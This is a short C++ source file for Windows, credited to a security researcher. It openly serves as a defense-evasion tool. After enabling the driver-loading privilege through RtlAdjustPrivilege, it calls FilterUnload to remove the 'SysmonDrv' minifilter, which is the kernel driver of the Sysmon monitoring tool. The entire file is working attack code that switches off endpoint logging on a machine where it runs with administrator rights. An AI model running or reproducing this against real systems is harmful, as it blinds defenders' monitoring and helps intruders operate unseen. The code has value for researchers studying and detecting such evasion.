#include "stdafx.h"
#include <Windows.h>
#include <fltuser.h>

#pragma comment(lib,"FltLib.lib")

/*
Author: Osanda Malith Jayathissa (@OsandaMalith)
Website: https://osandamalith.com
Description: Unloading a minifilter driver by calling the FilterUnload which is the Win32 equivalent of FltUnloadFilter. 
             It will call the minifilter's FilterUnloadCallback (PFLT_FILTER_UNLOAD_CALLBACK) routine.
             In this code we are unloading the "SysmonDrv" minifilter.
             You need administrative privs to escalete to SeLoadDriverPrivilege.
*/

typedef NTSTATUS(WINAPI *_RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);

int _tmain(int argc, _TCHAR* argv[]) {
	
	ULONG t;
	HRESULT unload;
	LPCWSTR driver = L"SysmonDrv";

	_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");
	
	RtlAdjustPrivilege(012, TRUE, FALSE, &t);

	unload = FilterUnload(driver);

	wprintf(L"%ls", unload == S_OK ? 
		L"Minifilter Successfully Unloaded" : 
		L"An Error Occured. Check Privs."
	);
    
	return 0;
}
